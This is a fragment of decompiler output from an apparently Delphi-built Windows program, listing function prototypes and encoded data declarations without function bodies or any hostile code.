// int __userpurge sub_41AF28@<eax>(HANDLE *a1@<eax>, int a2, int a3);
// _DWORD *__userpurge sub_41AF50@<eax>(int a1@<eax>, char a2@<dl>, char *a3@<ecx>, __int16 a4);
// _DWORD *__userpurge sub_41AF94@<eax>(int a1@<eax>, char a2@<dl>, char *a3@<ecx>, int a4, __int16 a5);
// _DWORD *__usercall sub_41B05C@<eax>(_DWORD *a1@<eax>, char a2@<dl>);
// int __usercall sub_41B090@<eax>(int result@<eax>, int a2@<edx>, int a3@<ecx>);
// int __usercall sub_41B098@<eax>(_DWORD *a1@<eax>, char *a2@<edx>, int a3@<ecx>);
// int __usercall sub_41B0D0@<eax>(int a1@<eax>, int a2@<edx>, __int16 a3@<cx>);
// int __usercall sub_41B0F4@<eax>(int result@<eax>);
// _DWORD *__usercall sub_41B10C@<eax>(int a1@<eax>, char *a2@<edx>);
// _DWORD *__usercall sub_41B164@<eax>(_DWORD *a1@<eax>, char a2@<dl>);
// int __usercall sub_41B190@<eax>(int *a1@<eax>);
// int __usercall sub_41B1A8@<eax>(int *a1@<eax>);
// int __usercall sub_41B1D0@<eax>(int *a1@<eax>, int a2@<edx>);
_DWORD sub_41B1FC(); // weak
// int __usercall sub_41B288@<eax>(int *a1@<eax>, char *a2@<edx>, int a3@<ecx>);
// _DWORD *__userpurge sub_41B2D8@<eax>(int a1@<eax>, char a2@<dl>, int a3@<ecx>, int a4);
// int __usercall sub_41B320@<eax>(_DWORD *a1@<eax>, char a2@<dl>);
// int __usercall sub_41B348@<eax>(int result@<eax>, int a2@<edx>);
// int __userpurge sub_41B424@<eax>(int a1@<eax>, char a2@<dl>, int a3@<ecx>, __int32 a4, __int32 a5, int a6, int a7);
// char __usercall sub_41B47C@<al>(int a1@<eax>);
// _DWORD *__usercall sub_41B4D4@<eax>(int a1@<eax>, int *a2@<edx>);
// int __usercall sub_41B558@<eax>(int a1@<eax>, char *a2@<edx>);
// void __usercall sub_41B620(int a1@<eax>, _BYTE *a2@<edx>);
// void __usercall sub_41B6CC(int a1@<eax>);
int __cdecl sub_41B750(_DWORD, _DWORD, _DWORD); // weak
int sub_41B768();
int sub_41B774(void); // weak
// int __usercall sub_41B7A0@<eax>(_DWORD *a1@<eax>, char a2@<dl>);
// int __usercall sub_41B7DC@<eax>(_DWORD *a1@<eax>, char a2@<dl>, int a3@<ecx>);
// char __userpurge sub_41B800@<al>(int a1@<eax>, _BYTE *a2@<edx>, int a3, int a4, void (*a5)(void), int a6);
// char __userpurge sub_41B834@<al>(int a1@<eax>, _BYTE *a2@<edx>, int a3, int a4, void (*a5)(void), int a6);
// bool __usercall sub_41B910@<al>(_DWORD *a1@<eax>, int a2@<ecx>);
// __int64 __usercall sub_41B924@<edx:eax>(__int64 result@<edx:eax>, int a2@<ecx>);
// int *__usercall sub_41B944@<eax>(int a1@<eax>, int *a2@<edx>, char *a3@<ecx>);
// void __usercall sub_41B9AC(int a1@<eax>);
// _DWORD *__usercall sub_41BA28@<eax>(int *a1@<eax>);
// int __usercall sub_41BB48@<eax>(int *a1@<eax>);
// int __usercall sub_41BB6C@<eax>(int a1@<eax>);
// int __usercall sub_41BBA8@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>);
// int __usercall sub_41BC3C@<eax>(int *a1@<eax>);
// __int64 __usercall sub_41BC54@<edx:eax>(_DWORD *a1@<eax>, int a2@<ecx>);
// int __usercall sub_41BC64@<eax>(_DWORD *a1@<eax>, int a2@<ecx>);
// _DWORD *__usercall sub_41BC78@<eax>(_DWORD *result@<eax>, char *a2@<edx>, unsigned int a3@<ecx>);
int __thiscall sub_41BCC4(_DWORD); // weak
// _DWORD *__usercall sub_41BD00@<eax>(_DWORD *a1@<eax>);
// int __usercall sub_41BD58@<eax>(_DWORD *a1@<eax>, int *a2@<edx>);
bool __cdecl sub_41BE04(int a1);
// int __usercall sub_41BE24@<eax>(_DWORD **a1@<eax>, int a2);
int __cdecl sub_41BE84(int a1);
int __cdecl sub_41BF94(int a1);
int __cdecl sub_41C034(int a1);
// int __usercall sub_41C0D8@<eax>(_DWORD *a1@<eax>, int a2@<edx>);
// _DWORD *__usercall sub_41C2B0@<eax>(int *a1@<eax>, int *a2@<edx>, int a3@<ecx>);
// _DWORD *__usercall sub_41C320@<eax>(_DWORD *a1@<eax>, int *a2@<edx>, int a3@<ecx>);
// double __usercall sub_41C3F0@<st0>(_DWORD *a1@<eax>, int a2@<ecx>);
// double __usercall sub_41C430@<st0>(_DWORD *a1@<eax>, int a2@<ecx>);
// double __usercall sub_41C470@<st0>(_DWORD *a1@<eax>, int a2@<ecx>);
// double __usercall sub_41C4BC@<st0>(_DWORD *a1@<eax>, int a2@<ecx>);
// void *__usercall sub_41C4FC@<eax>(_DWORD *a1@<eax>, volatile __int32 *a2@<edx>, int a3@<ecx>);
// __int64 __usercall sub_41C5FC@<edx:eax>(_DWORD *a1@<eax>, int a2@<ecx>);
// __int64 __usercall sub_41C668@<edx:eax>(_DWORD *a1@<eax>, int a2@<ecx>);
// int __usercall sub_41C6AC@<eax>(_DWORD *a1@<eax>, int a2@<ecx>);
int __thiscall sub_41C6B4(void *this);
// char __usercall sub_41C6BC@<al>(_DWORD *a1@<eax>, _BYTE *a2@<edx>, _DWORD *a3@<ecx>);
// _DWORD *__usercall sub_41C6FC@<eax>(int a1@<eax>, int a2);
int __cdecl sub_41C7FC(int a1);
// _DWORD *__usercall sub_41C818@<eax>(_DWORD *a1@<eax>, int *a2@<edx>);
// _BYTE *__usercall sub_41C9F8@<eax>(_DWORD *a1@<eax>, int **a2@<edx>);
// int __usercall sub_41CA40@<eax>(int a1@<eax>, int a2@<edx>, __int32 a3@<ecx>, int a4);
_DWORD *__cdecl sub_41CA80(int a1);
// int __usercall sub_41CB40@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edx>, __int32 a3@<ecx>, int a4@<esi>);
// int __usercall sub_41CE64@<eax>(_DWORD *a1@<eax>, int a2@<edx>);
// _DWORD *__usercall sub_41CF20@<eax>(_DWORD *a1@<eax>, char **a2@<edx>, int a3@<ecx>);
// OLECHAR **__usercall sub_41CF5C@<eax>(_DWORD *a1@<eax>, char **a2@<edx>);
// _DWORD *__usercall sub_41D018@<eax>(_DWORD *a1@<eax>, OLECHAR **a2@<edx>, int a3@<ecx>, int a4@<ebx>, int a5@<esi>);
// __int64 __usercall sub_41D0FC@<edx:eax>(_DWORD *a1@<eax>, int a2@<ecx>);
// _DWORD *__usercall sub_41D110@<eax>(_DWORD *a1@<eax>, int a2@<ecx>);
int __cdecl sub_41D158(int a1);
// _DWORD *__usercall sub_41D180@<eax>(int a1@<eax>, int a2);
int __cdecl sub_41D1B0(int a1);
// _DWORD *__usercall sub_41D20C@<eax>(_DWORD *a1@<eax>, int a2@<ecx>);
// _DWORD *__usercall sub_41D3A8@<eax>(_DWORD *a1@<eax>, int a2@<ecx>);
// int __usercall sub_41D3F0@<eax>(_DWORD *a1@<eax>, char a2@<dl>);
// int __usercall sub_41D498@<eax>(int a1@<eax>, __int32 a2@<edx>, int a3@<ecx>);
// int __usercall sub_41D550@<eax>(int result@<eax>, int a2@<edx>);
// int __usercall sub_41D568@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>);
// int __usercall sub_41D590@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>);
// _DWORD *__usercall sub_41D604@<eax>(_DWORD *result@<eax>, signed int a2@<edx>);
// _DWORD *__usercall sub_41D64C@<eax>(_WORD *a1@<eax>, int a2@<ecx>, int a3);
int sub_41D80C(void); // weak
// int __usercall sub_41DA04@<eax>(_DWORD *a1@<eax>, char a2@<dl>);
// int __usercall sub_41DA30@<eax>(int a1@<eax>, int a2@<edx>);
// int __userpurge sub_41DA3C@<eax>(int result@<eax>, char *a2@<edx>, char a3@<cl>, int (*a4)(void), int a5, int a6, int a7);
// _DWORD *__userpurge sub_41DA64@<eax>(_DWORD *result@<eax>, char *a2@<edx>, char a3@<cl>, void (__stdcall *a4)(struct _EXCEPTION_REGISTRATION_RECORD *), int a5, int a6, int a7);
// int __usercall sub_41DA90@<eax>(int a1@<eax>);
// int __usercall sub_41DAA0@<eax>(int a1@<eax>);
// int __usercall sub_41DAA8@<eax>(int a1@<eax>, int a2@<edx>);
// int __usercall sub_41DAE4@<eax>(int a1@<eax>, int a2@<edx>);
// _DWORD *__usercall sub_41DAFC@<eax>(_DWORD *result@<eax>, char *a2@<edx>, unsigned int a3@<ecx>);
// _DWORD *__userpurge sub_41DB48@<eax>(_DWORD *a1@<eax>, void (__stdcall *a2)(struct _EXCEPTION_REGISTRATION_RECORD *), int a3);
// int __usercall sub_41DBD0@<eax>(int a1@<eax>);
// _DWORD *__usercall sub_41DBE8@<eax>(_DWORD *a1@<eax>);
// _DWORD *__usercall sub_41DC38@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ecx>);
// int __usercall sub_41DCD8@<eax>(_BYTE *a1@<eax>, int a2);
// int __usercall sub_41DD28@<eax>(int a1@<eax>, int a2@<edx>);
// int __usercall sub_41DE04@<eax>(_DWORD *a1@<eax>, int *a2@<edx>);
// int __usercall sub_41E204@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ecx>);
// _DWORD *__userpurge sub_41E22C@<eax>(_DWORD *a1@<eax>, int a2@<ecx>, char a3, int a4, int a5);
// _DWORD *__userpurge sub_41E250@<eax>(_DWORD *a1@<eax>, int a2@<ecx>, char a3);
// _DWORD *__userpurge sub_41E274@<eax>(_DWORD *a1@<eax>, int a2@<ecx>, char a3, int a4);
// _DWORD *__userpurge sub_41E298@<eax>(_DWORD *a1@<eax>, int a2@<ecx>, char a3, int a4);
// _DWORD *__usercall sub_41E2BC@<eax>(_DWORD *a1@<eax>, char *a2@<edx>);
// _DWORD *__usercall sub_41E380@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ecx>);
// _DWORD *__userpurge sub_41E3F4@<eax>(_DWORD *a1@<eax>, int a2@<ecx>, __int64 a3);
// _DWORD *__usercall sub_41E44C@<eax>(_DWORD *a1@<eax>, int a2@<ecx>);
// _DWORD *__usercall sub_41E454@<eax>(_DWORD *a1@<eax>, int a2@<ecx>);
// _DWORD *__usercall sub_41E45C@<eax>(_DWORD *result@<eax>, char a2@<dl>, int a3@<ecx>);
// int __usercall sub_41E4A0@<eax>(int a1@<eax>, int *a2@<edx>);
bool __cdecl sub_41E568(int a1);
_DWORD *__cdecl sub_41E5B0(int a1);
// _DWORD *__usercall sub_41E604@<eax>(int a1@<eax>, int a2);
// _DWORD *__usercall sub_41E698@<eax>(int a1@<eax>, int a2@<edx>, int a3);
// _DWORD *__usercall sub_41E704@<eax>(int a1@<eax>, int a2);
bool __cdecl sub_41E7A8(int a1);
_DWORD *__cdecl sub_41E804(int a1);
bool __cdecl sub_41E8D8(int a1);
unsigned __int8 __cdecl sub_41E930(int a1);
bool __cdecl sub_41E97C(int a1);
unsigned __int8 __cdecl sub_41E9CC(int a1);
// int __usercall sub_41EA14@<eax>(int a1@<ebx>, int a2);
// OLECHAR **__usercall sub_41EA9C@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>, int a4);
// int __usercall sub_41EB08@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>);
// _DWORD *__usercall sub_41EB20@<eax>(int a1@<eax>, volatile __int32 *a2@<edx>, int a3@<ecx>, int a4);
// bool __usercall sub_41EC48@<al>(int a1@<eax>, int a2@<edx>, int a3);
bool __cdecl sub_41EC90(int a1);
int __cdecl sub_41ECF0(int a1);
// int __usercall sub_41EF20@<eax>(int a1@<ebx>, int a2);
// _DWORD *__usercall sub_41EFF4@<eax>(int a1@<ebx>, int a2);
bool __cdecl sub_41F114(int a1);
_DWORD *__cdecl sub_41F198(int a1);
// int __usercall sub_41F24C@<eax>(int a1@<ebx>, int a2);
// unsigned __int16 *__usercall sub_41F2D8@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>, int a4);
// char __usercall sub_41F348@<al>(_DWORD *a1@<edx>, _DWORD **a2@<ecx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>);
// _DWORD *__usercall sub_41F460@<eax>(_DWORD *a1@<eax>, unsigned __int16 *a2@<edx>, int a3@<edi>, int a4@<esi>);
// _DWORD *__usercall sub_41F858@<eax>(int a1@<eax>, char *a2@<edx>);
// _DWORD *__usercall sub_41F8AC@<eax>(_DWORD *a1@<eax>);
// _DWORD *__usercall sub_41F8BC@<eax>(_DWORD *a1@<eax>, char *a2@<edx>);
// _DWORD *__usercall sub_41F904@<eax>(_DWORD *a1@<eax>, char *a2@<edx>, int *a3@<ecx>);
// _DWORD *__usercall sub_41F99C@<eax>(_DWORD *a1@<eax>, CHAR *a2@<edx>);
// _DWORD *__usercall sub_41F9F0@<eax>(_DWORD *a1@<eax>, __int16 *a2@<edx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>);
// _DWORD *__usercall sub_41FAA4@<eax>(_DWORD *a1@<eax>, char a2@<dl>, int a3@<ecx>);
// _DWORD *__usercall sub_41FAB8@<eax>(int a1@<eax>, char a2@<dl>, _BYTE *a3@<ecx>);
// _DWORD *__usercall sub_41FB04@<eax>(_DWORD *a1@<eax>, char a2@<dl>);
// int __usercall sub_41FB7C@<eax>(int result@<eax>);
// __int64 __usercall sub_41FB88@<edx:eax>(int a1@<eax>, _DWORD *a2@<edx>, int a3@<ecx>);
// __int64 __usercall sub_41FB9C@<edx:eax>(int a1@<eax>, _DWORD *a2@<edx>, int a3@<ecx>);
// _DWORD *__usercall sub_41FBB0@<eax>(int a1@<eax>, _DWORD *a2@<edx>, int a3@<ecx>);
int sub_41FBBC(); // weak
// int __usercall sub_41FBC8@<eax>(int a1@<eax>, int a2@<edx>);
// _DWORD *__usercall sub_41FBF4@<eax>(int a1@<eax>, int a2@<edx>);
// int __usercall sub_41FC1C@<eax>(_BYTE *a1@<eax>, int *a2@<edx>);
// _DWORD *__usercall sub_41FC74@<eax>(int a1@<eax>, _DWORD *a2@<edx>);
// int __usercall sub_41FCAC@<eax>(int result@<eax>);
// int __usercall sub_41FD04@<eax>(int result@<eax>);
// _DWORD *__usercall sub_41FD40@<eax>(int a1@<eax>, int a2@<edx>);
// _DWORD *__usercall sub_41FD64@<eax>(int a1@<eax>, int a2@<edx>);
// int __usercall sub_41FD80@<eax>(int a1@<eax>, int a2@<edx>, char a3@<cl>);
// int __usercall sub_41FDDC@<eax>(int a1@<eax>, _DWORD *a2@<edx>);
int sub_41FE64();
void __stdcall sub_41FE68(int a1, int a2);
int sub_41FE70();
// volatile __int32 *__usercall sub_41FE78@<eax>(int a1@<eax>, volatile __int32 *a2@<edx>);
// int __usercall sub_41FE8C@<eax>(int a1@<eax>);
int sub_41FE94();
// int __usercall sub_41FE9C@<eax>(int result@<eax>);
// int __usercall sub_41FEA8@<eax>(int result@<eax>);
// int __usercall sub_41FEB4@<eax>(int result@<eax>);
// _DWORD *__usercall sub_41FEC4@<eax>(int *a1@<eax>, int *a2@<edx>, int a3@<ecx>);
int __fastcall sub_41FECC(int a1, int a2);
// char __userpurge sub_41FED4@<al>(int a1@<eax>, int a2@<edx>, _BYTE *a3@<ecx>, _BYTE *a4);
// void __usercall sub_41FF54(int a1@<eax>, int *a2@<edx>);
// int __usercall sub_41FF6C@<eax>(int a1@<eax>, _BYTE *a2@<edx>);
// _DWORD *__usercall sub_41FFBC@<eax>(_DWORD *a1@<eax>, int *a2@<edx>);
// volatile __int32 *__usercall sub_420048@<eax>(int a1@<eax>, __int32 a2@<edx>);
// int __usercall sub_42005C@<eax>(int a1@<eax>, int a2@<edx>);
// int __usercall sub_420088@<eax>(int a1@<eax>);
// int __usercall sub_420098@<eax>(int result@<eax>, int a2@<edx>, char a3@<cl>);
// _DWORD *__usercall sub_4200E8@<eax>(_DWORD *result@<eax>, char a2@<dl>);
int __fastcall sub_420130(int a1, int a2);
int __fastcall sub_420158(int a1, int a2);
// int __usercall sub_420180@<eax>(int a1@<eax>);
void __stdcall sub_420198(int a1);
int __stdcall sub_4201A0(int a1, _DWORD *a2, _DWORD *a3);
_DWORD *sub_420224();
// void __usercall sub_420290(void *a1@<eax>);
// int __usercall sub_420298@<eax>(int a1@<ebx>);
void sub_420340();
int sub_4203BC();
void sub_420404();
int sub_420424();
void sub_42046C();
// HICON __stdcall ExtractIconA(HINSTANCE hInst, LPCSTR pszExeFileName, UINT nIconIndex);
int sub_42047C();
void sub_4204AC();
int sub_4204E4();
void sub_420514();
// _DWORD *__usercall sub_420964@<eax>(int a1@<eax>, char a2@<dl>, __int16 a3@<cx>);
// void __usercall sub_4209A0(_DWORD *a1@<eax>, char a2@<dl>);
// void __usercall sub_4209C4(int a1@<eax>);
// void __usercall sub_4209D0(int a1@<eax>);
// signed int __usercall sub_420DDC@<eax>(signed int result@<eax>);
// char __usercall sub_420DEC@<al>(int a1@<eax>, volatile __int32 *a2@<edx>);
// char __usercall sub_420DFC@<al>(_BYTE *a1@<eax>, _DWORD *a2@<edx>);
// char __usercall sub_420FC0@<al>(int a1@<eax>, volatile __int32 *a2@<edx>);
// char __usercall sub_420FD0@<al>(_BYTE *a1@<eax>, _DWORD *a2@<edx>);
// int __usercall sub_420FE0@<eax>(int a1@<eax>);
// char __usercall sub_421188@<al>(int a1@<eax>);
// int __usercall sub_421190@<eax>(int a1@<eax>);
// int __usercall sub_421228@<eax>(int a1@<eax>);
// int __usercall sub_421230@<eax>(int a1@<eax>);
// char __usercall sub_421310@<al>(int a1@<eax>);
// void __usercall sub_421318(int a1@<eax>);
// BOOL __usercall sub_421340@<eax>(int y@<ecx>, int x@<edx>, int a3@<eax>);
// bool __usercall sub_42136C@<al>(int a1@<eax>);
// void __usercall sub_4213C8(int a1@<eax>);
// BOOL __usercall sub_4213F0@<eax>(int a1@<eax>, struct tagPOINT *a2@<edx>, int a3@<ecx>);
// BOOL __usercall sub_421414@<eax>(int a1@<eax>, int *a2@<edx>);
// char __usercall sub_421434@<al>(int a1@<eax>);
// int __usercall sub_421490@<eax>(int a1@<eax>, int a2@<edx>);
int __fastcall sub_4214E4(_DWORD, _DWORD); // weak
// COLORREF __usercall sub_421558@<eax>(int a1@<eax>);
// int __usercall sub_421584@<eax>(int a1@<eax>);
// int __usercall sub_4215B4@<eax>(int a1@<eax>);
int sub_421630(void); // weak
int sub_421648(void); // weak
int sub_421660();
int sub_42166C();
_DWORD *sub_421678();
_DWORD *sub_4216CC();
// int __usercall sub_421774@<eax>(int a1@<eax>);
// HGDIOBJ __usercall sub_421784@<eax>(void *a1@<eax>, int *a2@<edx>, char a3@<cl>);
// int __usercall sub_4218E4@<eax>(__int16 a1@<ax>);
// int __usercall sub_421904@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>);
// HPALETTE __usercall sub_421918@<eax>(char *a1@<eax>);
int __cdecl sub_421A15(int, int);
// int __userpurge sub_421A30@<eax>(BITMAPINFOHEADER *a1@<eax>, HGDIOBJ *a2@<edx>, struct _EXCEPTION_REGISTRATION_RECORD *a3@<ecx>, int *a4);
// int __usercall sub_421BEC@<eax>(int result@<eax>);
// bool __usercall sub_421BF8@<al>(unsigned __int8 *a1@<eax>, unsigned __int8 *a2@<edx>, int a3);
// int __userpurge sub_421C88@<eax>(int a1@<eax>, HICON *a2@<edx>, int a3@<ecx>, int *a4, int *a5, int a6);
// unsigned int __usercall sub_421F90@<eax>(void *a1@<eax>, int a2@<edx>, int a3@<ecx>);
// int __userpurge sub_422074@<eax>(void *a1@<eax>, int *a2@<edx>, _DWORD *a3@<ecx>, int a4);
// bool __userpurge sub_4220D8@<al>(LPBITMAPINFO lpbmi@<ecx>, HPALETTE hPal@<edx>, HBITMAP a3@<eax>, int a4, LPVOID lpvBits);
int nullsub_7(void); // weak
// int __usercall sub_42218C@<eax>(int result@<eax>);
// BOOL __usercall sub_422198@<eax>(int a1@<eax>, HICON a2@<edx>, char a3@<cl>);
// _DWORD *__usercall sub_422394@<eax>(_DWORD *a1@<eax>, char a2@<dl>);
// int __usercall sub_4223CC@<eax>(int result@<eax>, int a2@<ecx>);
char __cdecl sub_4223E4(int a1);
// int __usercall sub_42243C@<eax>(int a1@<eax>, int a2@<edx>);
// char __usercall sub_422488@<al>(int a1@<eax>, int a2@<edx>);
int sub_4225D4();
// char __usercall sub_4225D8@<al>(int a1@<eax>);
// _DWORD *__usercall sub_4225DC@<eax>(int a1@<eax>, char *a2@<edx>);
// int __userpurge sub_422630@<eax>(int result@<eax>, int a2@<ebx>, int a3, int a4, char a5, char a6);
// int __usercall sub_422658@<eax>(int a1@<eax>);
// _DWORD *__usercall sub_422664@<eax>(int a1@<eax>, char *a2@<edx>);
// _BYTE *__usercall sub_4226C0@<eax>(_BYTE *result@<eax>, char a2@<dl>);
// int __usercall sub_4226D0@<eax>(int a1@<eax>);
void sub_4226DC();
// void __usercall sub_422788(int a1@<eax>);
// int __usercall sub_422828@<eax>(int result@<eax>);
// _DWORD *__usercall sub_42282C@<eax>(_DWORD *result@<eax>);
// _DWORD *__usercall sub_42284C@<eax>(_DWORD *a1@<eax>, char a2@<dl>);
// int __usercall sub_42287C@<eax>(int a1@<eax>);
// _DWORD *__usercall sub_422894@<eax>(_DWORD *a1@<eax>, char a2@<dl>);
// _DWORD *__usercall sub_4228E8@<eax>(_DWORD *a1@<eax>, char a2@<dl>);
// _DWORD *__usercall sub_422918@<eax>(int a1@<eax>, int a2@<edx>);
// BOOL __usercall sub_422978@<eax>(HICON a1@<eax>, int a2@<edx>, int *a3@<ecx>);
// bool __usercall sub_4229B8@<al>(int a1@<eax>);
// int __usercall sub_4229D0@<eax>(HICON a1@<eax>);
// int __usercall sub_4229E4@<eax>(int a1@<eax>);
// int __usercall sub_4229F8@<eax>(int a1@<eax>);
// HICON __usercall sub_422A0C@<eax>(HICON result@<eax>);
// _DWORD *__usercall sub_422A84@<eax>(_DWORD *result@<eax>);
// int __usercall sub_422B38@<eax>(int a1@<eax>, int a2@<edx>);
// _DWORD *__usercall sub_422BF0@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>);
// int __usercall sub_422C64@<eax>(_DWORD *a1@<eax>);
// int __usercall sub_422CA0@<eax>(int a1@<eax>, int a2@<edx>);
// int __usercall sub_422CB8@<eax>(int result@<eax>, int a2@<edx>);
// int __usercall sub_422CD4@<eax>(int result@<eax>, int a2@<edx>);
// int __usercall sub_422CEC@<eax>(_DWORD *a1@<eax>);
int __stdcall sub_422D18(int a1);
int __stdcall sub_422D2C(int a1);
HPALETTE sub_422D40();
// int __usercall sub_422D78@<eax>(int a1@<ebx>);
// char __usercall sub_422DBC@<al>(int a1@<ebx>);
// _DWORD *__usercall sub_422E88@<eax>(int a1@<eax>, char a2@<dl>);
// void __usercall sub_422EC0(_DWORD *a1@<eax>, char a2@<dl>);
// void __usercall sub_422EEC(int a1@<eax>);
// void __usercall sub_422EF8(int a1@<eax>);
// _DWORD *__usercall sub_422F04@<eax>(int a1@<eax>);
int sub_422F7C();
// void __usercall sub_423050(int a1@<ebx>);
// int __usercall sub_423168@<eax>(int a1@<eax>, int a2@<edx>, volatile __int32 *a3@<ecx>, int a4@<ebx>);
// int __usercall sub_4232AC@<eax>(char *a1@<eax>, int a2@<edx>);
// int __usercall sub_423378@<eax>(char *a1@<eax>, char *a2@<edx>);
// int __userpurge sub_4234DC@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4, int a5);
// char __usercall sub_423548@<al>(char *a1@<eax>, char *a2@<edx>);
// _DWORD *__usercall sub_42370C@<eax>(char *a1@<eax>, int a2@<edx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>);
int sub_42394B(); // weak
int __cdecl sub_423989(int, int); // idb
// int __usercall sub_42399C@<eax>(char *a1@<eax>, char *a2@<edx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>);
// _DWORD *__usercall sub_423AC0@<eax>(char *a1@<eax>, char *a2@<edx>, int a3@<ecx>, int a4@<ebx>, int a5@<edi>, int a6@<esi>);
int sub_423B99(); // weak
int __cdecl sub_423BA3(int, int, int, int, int, int, int, int, int, int); // weak
int __cdecl sub_423BD4(int, int); // idb
// int __usercall sub_423BE8@<eax>(char *a1@<eax>, int a2@<ebx>, int a3@<edi>, int a4@<esi>);
// int __usercall sub_4240C0@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>);
int sub_42420C();
void sub_424264();
// _DWORD *__userpurge sub_42433C@<eax>(_BYTE *a1@<eax>, char *a2@<edx>, char *a3@<ecx>, volatile __int32 *a4, int a5, int a6, _DWORD *a7, volatile __int32 *a8, int a9, char a10, int a11, char a12, int a13);
_DWORD *__fastcall sub_42478C(SIZE_T a1, char *a2, volatile __int32 *a3, char a4);
// _DWORD *__usercall sub_424C9C@<eax>(int a1@<eax>, int a2@<edx>, volatile __int32 *a3@<ecx>);
// int __userpurge sub_424DB4@<eax>(__int16 a1@<cx>, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19, int a20, int a21, int a22, int a23, int a24, int a25, int a26, int a27, int a28, int a29, int a30, int a31, int a32, int a33, int a34, int a35, int a36, int a37, int a38, int a39, int a40, int a41, int a42, int a43, int a44, int a45, int a46, int a47, int a48, int a49);
// int __usercall sub_424DD4@<eax>(int a1@<eax>);
// int __usercall sub_4254C4@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>);
// char __usercall sub_4264A4@<al>(int a1@<eax>);
// int __usercall sub_426A0C@<eax>(int a1@<eax>, volatile __int32 *a2@<edx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>);
// _DWORD *__usercall sub_426BB4@<eax>(volatile __int32 *a1@<eax>, int a2@<ebx>, int a3@<edi>);
char sub_426C44();
// int __usercall sub_426C8C@<eax>(int a1@<eax>, int a2@<ebx>, int a3@<edi>, int a4@<esi>);
// int __usercall sub_426DFC@<eax>(int a1@<eax>, int a2@<edi>, int a3@<esi>);
// int __usercall sub_427EF4@<eax>(int a1@<eax>);
// _DWORD *__usercall sub_427F04@<eax>(int a1@<eax>);
// LRESULT __userpurge fn@<eax>(int a1@<edi>, int a2@<esi>, int code, WPARAM wParam, _DWORD *lParam);
// void __userpurge TimerFunc(int a1@<ebx>, int a2@<esi>, HWND a3, UINT a4, UINT_PTR a5, DWORD a6);
void __stdcall sub_42974C(HWND a1, UINT a2, UINT_PTR a3, DWORD a4); // idb
// _DWORD *__usercall sub_4298FC@<eax>(int a1@<eax>, int a2@<edi>, int a3@<esi>);
int __far sub_42A234(); // weak
LRESULT __stdcall sub_42A288(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
__int16 sub_42A2E0();
int sub_42A3F0();
// void __usercall __noreturn start(int a1@<ebx>, int a2@<esi>);

//-------------------------------------------------------------------------
// Data declarations

int dword_401004[4] = { 1866598147, 1634036847, 366, 65536 }; // weak
int dword_40105C[2] = { 1951598090, 1735289202 }; // weak
int dword_401068[2] = { 1633027852, 1851877746 }; // weak
int dword_4011C8[5] = { 1112804113, 1684960623, 1634890305, 1145, 0 }; // weak
_UNKNOWN loc_401AE2; // weak
_UNKNOWN loc_401AE9; // weak
_UNKNOWN loc_401BC6; // weak
_UNKNOWN loc_401BCD; // weak
_UNKNOWN loc_402294; // weak
_UNKNOWN loc_40229B; // weak
_UNKNOWN loc_40243A; // weak
_UNKNOWN loc_402441; // weak
_UNKNOWN loc_4026CD; // weak
_UNKNOWN loc_4026D4; // weak
_UNKNOWN loc_4029C1; // weak
_UNKNOWN loc_4029C8; // weak
int dword_402FFC[16] =
{
  538976288,
  538976288,
  538976288,
  538976288,
  538976288,
  538976288,
  538976288,
  538976288,
  538976288,
  538976288,
  538976288,
  538976288,
  538976288,
  538976288,
  538976288,
  538976288
}; // weak
_UNKNOWN loc_403424; // weak
_UNKNOWN loc_40366C; // weak
_UNKNOWN loc_403673; // weak
_UNKNOWN loc_403AB8; // weak
_UNKNOWN loc_403AE4; // weak
_UNKNOWN loc_403CC4; // weak
_UNKNOWN loc_403D3F; // weak
_UNKNOWN loc_403F5E; // weak
_UNKNOWN loc_403FBE; // weak
int dword_404178 = 2573; // weak
char byte_404721 = '\0'; // weak
__int16 word_404A62 = 0; // weak
_UNKNOWN loc_405C35; // weak
_UNKNOWN loc_405C3C; // weak
const CHAR ValueName[4] = { '\0', '\0', '\0', '\0' }; // idb
_UNKNOWN loc_405E9F; // weak
_UNKNOWN loc_405F34; // weak
_UNKNOWN loc_405F3B; // weak
_UNKNOWN loc_4062D3; // weak
_UNKNOWN loc_4062DA; // weak
_UNKNOWN loc_406377; // weak
_UNKNOWN loc_40637E; // weak
_UNKNOWN loc_4063C7; // weak
_UNKNOWN loc_4063CE; // weak
_UNKNOWN loc_406476; // weak
_UNKNOWN loc_406621; // weak
_UNKNOWN loc_406659; // weak
_UNKNOWN loc_406B31; // weak
_UNKNOWN loc_406DF9; // weak
int dword_406E20[5] = { 1398016526, 1668440421, 1667584616, 344, 1 }; // weak
int dword_406E88[2] = { 14, 65536 }; // weak
int dword_406F4C[4] = { 1968129292, 1298550644, 1919905125, 4230521 }; // weak
int dword_406FA8[3] = { 1850295563, 1165260111, 1919906418 }; // weak
int dword_407000[3] = { 2017805577, 1852990836, -1064604575 }; // weak
int dword_407058[5] = { 2017805586, 1852990836, 2017815649, 1953523043, -1871810711 }; // weak
int dword_407168[3] = { 1632781579, 1164273518, 1919906418 }; // weak
int dword_4073D4[4] = { 1850295567, 1768710518, 1768902756, 1919251566 }; // weak
int dword_40748C[4] = { 1866679565, 1919252078, 1920091508, -1064603025 }; // weak
int dword_4074E8[5] = { 1665221904, 1936942435, 1819240790, 1869182049, 4230510 }; // weak
